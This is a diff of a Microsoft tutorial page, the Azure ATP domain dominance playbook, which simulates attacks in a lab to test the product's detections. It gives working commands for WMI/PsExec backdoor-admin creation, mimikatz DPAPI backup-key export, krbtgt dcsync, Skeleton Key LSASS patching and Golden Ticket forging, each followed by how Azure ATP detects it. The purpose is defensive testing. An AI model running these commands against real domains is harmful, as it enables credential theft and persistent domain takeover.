@@ -15,36 +15,18 @@ ms.date: 01/22/2018
  ms.reviewer: itargoet
 # ms.subservice
 # ROBOTS
-
+# Customer intent: As an Azure ATP user, I want to simulate domain dominance threats in a lab so I can see some of Azure ATP's capabilities.
 ---
 
-# Overview
+# # Tutorial: Domain dominance playbook
 
-The purpose of the **Azure ATP Security Alert Playbook Suite** is to illustrate **Azure ATP**'s capabilities in identifying and detecting potential attacks against your network. The playbooks in the suite explain how to test against some of Azure ATP's *discrete* detections using Azure ATP’s *signature*-based capabilities. The tutorials included do not include Azure ATP advanced machine-learning, user, or entity based behavioral detections and alerts. Those types of detections and alerts are not included in testing because they require a learning period, and real network traffic for up to 30 days.
+The last tutorial in this four part series for Azure ATP security alerts is a domain dominance playbook. The purpose of the Azure ATP security alert lab is to illustrate **Azure ATP**'s capabilities in identifying and detecting potential attacks against your network. The lab explains how to test against some of Azure ATP's *discrete* detections using Azure ATP’s *signature*-based capabilities. The tutorials do not include Azure ATP advanced machine-learning, user, or entity based behavioral detections and alerts. Those types of detections and alerts are not included in testing because they require a learning period, and real network traffic for up to 30 days. For more information about each tutorial in this series, see the [ATP security alert lab overview](atp-playbook-lab-overview.md).
 
-## Lab Setup
+This playbook explains the process of using real-world, publicly available hacking and attack tools against the domain dominance threat detections and security alerts services of Azure ATP. The methods covered are typically used at this point in the cyber-attack kill chain to achieve persistent domain dominance. 
 
-Make sure your Azure ATP lab setup matches the recommendation as closely as possible. The closer your lab is to the [suggested lab setup](atp-playbook-setup-lab.md), the easier it will be to follow each test.
+In this tutorial you will use the following methods to achieve persistent domain dominance: 
 
-![Azure ATP lab setup.](media/playbook-atp-setup-lab.png)
-
-# Executing an attack
-
-This Domain Dominance playbook explains the process of using real-world, publicly available hacking and attack tools to attempt attacks against domain dominance focused threat detection and security alert services of Azure ATP.
-
-Other phases of the Azure ATP Attack Simulation Playbook:
-
-- [Reconnaissance](atp-playbook-reconnaissance.md)
-- [Lateral Movements](atp-playbook-lateral-movement.md)
-
-This section follows the [Lateral Movement Phase](atp-playbook-domain-dominance.md) of the Azure ATP Attack Simulation Playbook.
-
-## Domain Dominance
-
-In the cyber-attack kill chain, during the phase of domain dominance, an attacker has already gained legitimate credentials to access your domain controller. Attacker access to your domain controller means all levels of damage to your network can be accomplished. However, in addition to immediate damage, attackers, especially sophisticated ones, like to place additional *insurance policies* into environments they've compromised. These attacks ensure that even if an attacker's initial compromise and actions are discovered, they'll still have additional avenues of persistence in your domain, increasing their chances of long-term success.
-
-This playbook covers the following methods typically used at this point in the cyber-attack kill chain to achieve persistent domain dominance: 
-
+> [!div class="checklist"]
 * [Remote Code Execution](#remote-code-execution)
 * [Data Protection API (DPAPI)](#data-protection-api-dpapi)
 * [Malicious Replication](#malicious-replication)
@@ -52,40 +34,49 @@ This playbook covers the following methods typically used at this point in the c
 * [Skeleton Key](#skeleton-key)
 * [Golden Ticket](#golden-ticket)
 
+## Prerequisites
+
+1. [A completed ATP security alert lab](atp-playbook-setup-lab.md) 
+     - We recommend following the lab setup instructions as closely as possible. The closer your lab is to the suggested lab setup, the easier it will be to follow the Azure ATP testing procedures.
+
+2. [Completion of the lateral movement playbook tutorial](atp-playbook-lateral-movement.md)
+
+## Domain Dominance
+
+In the cyber-attack kill chain, during the phase of domain dominance, an attacker has already gained legitimate credentials to access your domain controller. Attacker access to your domain controller means all levels of damage to your network can be accomplished. However, in addition to immediate damage, attackers, especially sophisticated ones, like to place additional *insurance policies* into environments they've compromised. These attacks ensure that even if an attacker's initial compromise and actions are discovered, they'll still have additional avenues of persistence in your domain, increasing their chances of long-term success.
+
 ### Remote Code Execution
 
-Remote code execution is exactly what it sounds like. Attackers establish a way to remotely execute code against a resource, in this case, against a domain controller.
-
-We'll try using these tools together to perform remote code execution and gain domain controller persistency:
+Remote code execution is exactly what it sounds like. Attackers establish a way to remotely execute code against a resource, in this case, against a domain controller. We'll try using these tools together to perform remote code execution and gain domain controller persistency:
 
 - Windows Management Instrumentation (WMI)
 - PsExec from SysInternals
 
 Using WMI via the command line, try to create a process locally on the domain controller to create a user named "InsertedUser", with a password of: pa$$w0rd1.
 
-1. Open the Command Line, running in context of *SamiraA* from the VictimPC, execute the following:
+1. Open the Command Line, running in context of *SamiraA* from the **VictimPC**, execute the following:
 
-``` cmd
-wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
-```
+   ``` cmd
+   wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
+   ```
 
 2. Now with the user created, add the user to the "Administrators" group on the domain controller:
 
-``` cmd
-PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
-```
+   ``` cmd
+   PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
+   ```
 
-![Use remote code execution (PsExec), to add the new user to the Admin group on the domain controller](media/playbook-dominance-psexec_addtoadmins.png)
+   ![Use remote code execution (PsExec), to add the new user to the Admin group on the domain controller](media/playbook-dominance-psexec_addtoadmins.png)
 
 3. Go to **Active Directory Users and Computers (ADUC)** on **ContosoDC** and find the **InsertedUser**. 
 
 4. Right click on **Properties** and check membership.
 
-![View the properties of "InsertedUser"](media/playbook-dominance-inserteduser_properties.png)
+   ![View the properties of "InsertedUser"](media/playbook-dominance-inserteduser_properties.png)
 
-As the attacker, you've now successfuly created a new user (using WMI), and added them to the Administrators group (using PsExec). From a persistence perspective, another legitimate, independent credential was created on the domain controller. The new credential gives the attacker persistent access to the domain controller in case the previous credential access gained was discovered and removed.
+As the attacker, you've successfully created a new user by using WMI. You've also added the new user to the Administrators group by using PsExec. From a persistence perspective, another legitimate, independent credential was created on the domain controller. The new credential gives the attacker persistent access to the domain controller in case the previous credential access gained was discovered and removed.
 
-#### Remote Code Execution Detection
+### Remote Code Execution Detection in Azure ATP
 
 Log in to the Azure ATP portal to check what, if anything, Azure ATP detected from our last attack: 
 
@@ -97,13 +88,11 @@ Due to encryption on the WMI session, certain values such as the actual WMI meth
 
 VictimPC, the computer, should never be executing remote code against the Domain Controllers.
 
-As Azure ATP learns who is inserted to what Security Groups over time, suspicious activities like these are identified as anomolous activity in the timeline. As this lab was just built, and is still within the learning period, this activity won't display as an alert. Security group modification detection by Azure ATP can be validated by checking the activity timeline.
+As Azure ATP learns who is inserted into which Security Groups over time, suspicious activities like these are identified as anomalous activity in the timeline. Since this lab was recently built and is still within the learning period, this activity won't display as an alert. Security group modification detection by Azure ATP can be validated by checking the activity timeline. Azure ATP also allows you to generate reports on all Security Group modifications which can be emailed to you proactively.
 
-Access the **Administrator** page in the Azure ATP portal using the  Search tool. The Azure ATP detection of the user insertion is displayed in the Admin Group activity timeline. 
+Access the **Administrator** page in the Azure ATP portal using the Search tool. The Azure ATP detection of the user insertion is displayed in the Admin Group activity timeline. 
 
 ![View added user to sensitive security group](media/playbook-dominance-admininserteduser.png)
-
-Azure ATP also allows you to [generate reports on all Security Group modifications](https://docs.microsoft.com/en-us/azure-advanced-threat-protection/reports) which can be emailed to you proactively.
 
 ### Data Protection API (DPAPI)
 
@@ -113,17 +102,17 @@ Using **mimikatz**, we'll attempt to export the master key from the domain contr
 
 1. Execute the following command against the domain controller:
 
-``` cmd
-mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
-```
+   ``` cmd
+   mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
+   ```
 
-![Use of mimikatz to export the DPAPI backup key from Active Directory](media/playbook-dominance-dpapi_mimikatz.png)
+   ![Use of mimikatz to export the DPAPI backup key from Active Directory](media/playbook-dominance-dpapi_mimikatz.png)
 
-2. Verify the master key file export on XYZ.
+2. Verify the master key file export occurred by looking in the directory from which you ran mimikatz.exe from and copying the legacy key from the command prompt.
 
-As attackers, we now have the key to decrypt any DPAPI-encrypted file/sensitive data from *any* machine in the entire Forest.   
+As attackers, we now have the key to decrypt any DPAPI-encrypted file/sensitive data from *any* machine in the entire Forest.
 
-#### DPAPI Detection
+### DPAPI Detection in Azure ATP
 
 Using the Azure ATP portal, let's verify that Azure ATP successfully detected our DPAPI attack:
 
@@ -133,7 +122,7 @@ Using the Azure ATP portal, let's verify that Azure ATP successfully detected ou
 
 Malicious replication allows an attacker to replicate user information using Domain Admin (or equivalent) credentials. Malicious replication essentially allows an attacker to remotely harvest a credential. Obviously, the most critical account to attempt to harvest is "krbtgt" as it the master key used to sign all Kerberos tickets.
 
-The two major hacking toolsets that allow attackers to attempt malicious replication are  **Mimikatz**, and Core Security’s **Impacket**.
+The two major hacking tool sets that allow attackers to attempt malicious replication are **Mimikatz**, and Core Security’s **Impacket**.
 
 #### Mimikatz lsadump::dcsync
 
@@ -143,11 +132,11 @@ From the **VictimPC**, in context of **SamirA**, execute the following Mimikatz 
 mimikatz.exe "lsadump::dcsync /domain:contoso.azure /user:krbtgt" "exit" >> c:\temp\ContosoDC_krbtgt-export.txt
 ```
 
-We've just replicated the “krbtgt” account information to: c:\\temp\\krbtgt-export.txt
+We've just replicated the “krbtgt” account information to: c:\\temp\\ContosoDC_krbtgt-export.txt
 
 ![Malicious Replication via mimikatz](media/playbook-dominance-maliciousrep_mimikatz.png)
 
-#### Malicious Replication Detection
+#### Malicious Replication Detection in Azure ATP
 
 Using the Azure ATP portal, verify the SOC is now aware of the malicious replication from VictimPC.
 
@@ -155,25 +144,25 @@ Using the Azure ATP portal, verify the SOC is now aware of the malicious replica
 
 ### Skeleton Key
 
-Another domain dominance method attackers use is known as **Skeleton Key** . Using a Skeleton Key (master password) the attacker creates, the attacker can masquerade *as any user* at *any time*. In a Skeleton Key attack, every system user still has the ability to sign in with their normal password, but each of their accounts is also given a master password. The new master password or Skeleton Key gives anyone who knows it, open access to the account. A Skeleton Key attack is achieved by patching the LSASS.exe process on the domain controller, forcing users to authenticate via a downgraded encryption type.
+Another domain dominance method attackers use is known as **Skeleton Key**. Using a Skeleton Key, the attacker creates, the attacker can masquerade *as any user* at *any time*. In a Skeleton Key attack, every user still has the ability to sign in with their normal password, but each of their accounts is also given a master password. The new master password or Skeleton Key gives anyone who knows it, open access to the account. A Skeleton Key attack is achieved by patching the LSASS.exe process on the domain controller, forcing users to authenticate via a downgraded encryption type.
 
 Let's see exactly how Skeleton Key works:
 
-1. Move **mimikatz** to **ContosoDC** using the **SamirA** credentials we acquired before. 
-<br>Making sure to push the right architecture of **mimikatz.exe** based on the architecture type of the DC (i.e. 64 bit vs 32-bit). From the **mimikatz** folder, execute:
+1. Move **mimikatz** to **ContosoDC** using the **SamirA** credentials we acquired before. Make sure to push the right architecture of **mimikatz.exe** based on the architecture type of the DC (64 bit vs 32-bit). From the **mimikatz** folder, execute:
 
-``` cmd
-xcopy mimikatz.exe \\ContosoDC\c$\temp
-```
+   ``` cmd
+   xcopy mimikatz.exe \\ContosoDC\c$\temp
+   ```
 
-3. With **mimikatz** now stagged on the DC, remotely execute it via PsExec:
+2. With **mimikatz** now staged on the DC, remotely execute it via PsExec:
 
-``` cmd
-PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
-```
+   ``` cmd
+   PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
+   ```
+
 4. Success! You successfully patched the LSASS process on **ContosoDC**. 
 
-![Skeleton Key attack via mimikatz](media/playbook-dominance-skeletonkey.png)
+   ![Skeleton Key attack via mimikatz](media/playbook-dominance-skeletonkey.png)
 
 ### Exploiting the Skeleton Key Patched LSASS
 
@@ -187,17 +176,18 @@ When prompted, use the wrong password (on purpose). This proves that the account
 
 ![Use of *wrong* password after Skeleton Key attack (this method works exactly as described)](media/playbook-dominance-skeletonkey_wrong.png)
 
-But Skeleton Key adds an additional password to each account.  This time, do the "runas" command again but this time use "mimikatz" as the password.
+But Skeleton Key adds an additional password to each account. Do the "runas" command again but this time use "mimikatz" as the password.
 
 ``` cmd
 runas /user:ronhd@contoso.azure "notepad"
 ```
 
-This will create a new process, *notepad*, running in the context of RonHD.
+This will create a new process, *notepad*, running in the context of RonHD. **Skeleton Key can be done for _any_ account, including service accounts and computer accounts.**
 
-**Skeleton Key can be done for _any_ account, including service accounts and computer accounts.**
+> [!Important]
+> It is important that you restart  ContosoDC after you execute the Skeleton Key attack. Without doing so, the LSASS.exe process on ContosoDC will be patched and modified, downgrading every authentication request to RC4.
 
-#### Skeleton Key attack Detection
+### Skeleton Key attack Detection in Azure ATP
 
 What did Azure ATP detect and report while all of this was happening?
 
@@ -207,48 +197,43 @@ Azure ATP successfully detected the suspicious pre-authentication encryption met
 
 ### Golden Ticket - Existing User
 
-> [!Important]
-> It is important that you restart  ContosoDC after you executed the Skeleton Key attack. Without doing so, the LSASS.exe process on ContosoDC will be patched and modified, downgrading every authentication request to RC4.
-
-After stealing the “Golden Ticket”, (“krbtgt” account explained [here via Malicious Replication](#Malicious-Replication), an attacker is able to sign tickets *as if they are the domain controller*. **Mimikatz**, the Domain SID and the stolen "krbtgt" account are all required to accomplish this attack.
-
-Not only can we generate tickets for a user, we can generate tickets for users who don't even exist!
+After stealing the “Golden Ticket”, (“krbtgt” account explained [here via Malicious Replication](#Malicious-Replication), an attacker is able to sign tickets *as if they are the domain controller*. **Mimikatz**, the Domain SID, and the stolen "krbtgt" account are all required to accomplish this attack. Not only can we generate tickets for a user, we can generate tickets for users who don't even exist!
 
 1. As JeffL, run the following on VictimPC to acquire the domain SID:
 
-``` cmd
-whoami /user
-```
+   ``` cmd
+   whoami /user
+   ```
 
-![SID for golden ticket user](media/playbook-dominance-golden_whoamisid.png)
+   ![SID for golden ticket user](media/playbook-dominance-golden_whoamisid.png)
 
-Identify and copy the Domain SID (highlighted above).
+2. Identify and copy the Domain SID highlighted in the above screenshot.
 
-2. Using **mimikatz**, take the copied Domain SID, along with the stolen “krbtgt” user's NTLM hash to generate the TGT. Insert the following into a cmd.exe as JeffV:
+3. Using **mimikatz**, take the copied Domain SID, along with the stolen “krbtgt” user's NTLM hash to generate the TGT. Insert the following into a cmd.exe as JeffV:
 
-``` cmd
-mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
-```
+   ``` cmd
+   mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
+   ```
 
-![Generate the Golden Ticket](media/playbook-dominance-golden_generate.png)
+   ![Generate the Golden Ticket](media/playbook-dominance-golden_generate.png)
 
-The ```/ptt``` part of the command allowed us to immediately pass the generated ticket into memory.
+   The ```/ptt``` part of the command allowed us to immediately pass the generated ticket into memory.
 
-3. Let's make sure the credential is in memory.  Execute ```klist``` in the console.
+4. Let's make sure the credential is in memory.  Execute ```klist``` in the console.
 
-![klist results after passing the generated ticket](media/playbook-dominance-golden_klist.png)
+   ![klist results after passing the generated ticket](media/playbook-dominance-golden_klist.png)
 
-4. Now, execute the following Pass-the-Ticket command to use it against the DC:
+4. Execute the following Pass-the-Ticket command to use it against the DC:
 
-``` cmd
-dir \\ContosoDC\c$
-```
+   ``` cmd
+   dir \\ContosoDC\c$
+   ```
 
-Success--You generated a **fake** Golden Ticket for SamiraA.
+   Success! You generated a **fake** Golden Ticket for SamiraA.
 
-![Execute Golden Ticket via mimikatz](media/playbook-dominance-golden_ptt.png)
+   ![Execute Golden Ticket via mimikatz](media/playbook-dominance-golden_ptt.png)
 
-Why did it work? The Golden Ticket Attack works because the ticket generated was properly signed with the 'KRBTGT' key (harvested earlier.  This allows us, as the attacker, to gain access to ContosoDC, adding ourselves to any Security Group that we wish to leverage.
+Why did it work? The Golden Ticket Attack works because the ticket generated was properly signed with the 'KRBTGT' key we harvested earlier. This allows us, as the attacker, to gain access to ContosoDC, adding ourselves to any Security Group that we wish to leverage.
 
 #### Golden Ticket- Existing User attack detection
 
@@ -259,13 +244,12 @@ Azure ATP uses multiple methods to detect suspected attacks of this type. In thi
 > [!Important]
 >Reminder. As long as the KRBTGT harvested by an attacker remains valid within an environment, the tickets generated with it also remain valid. In this case, the attacker achieves persistent domain dominance until the [KRBTGT is reset, twice](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password).
 
-## Join the Community
+## Next steps
 
-Have more questions, or an interest in discussing Azure ATP and related security with others? Join the [Azure ATP Community](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection) today!
-
-## See Also
-* [Azure ATP Reconnaissance Playbook](atp-playbook-reconnaissance.md)
-* [Azure ATP Lateral Movement Playbook](atp-playbook-lateral-movement.md)
 * [Azure ATP Security Alert Guide](suspicious-activity-guide.md)
 * [Investigate lateral movement paths with Azure ATP](use-case-lateral-movement-path.md)
 * [Check out the Azure ATP forum!](https://aka.ms/azureatpcommunity)
+
+## Join the Community
+
+Have more questions, or an interest in discussing Azure ATP and related security with others? Join the [Azure ATP Community](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection) today!
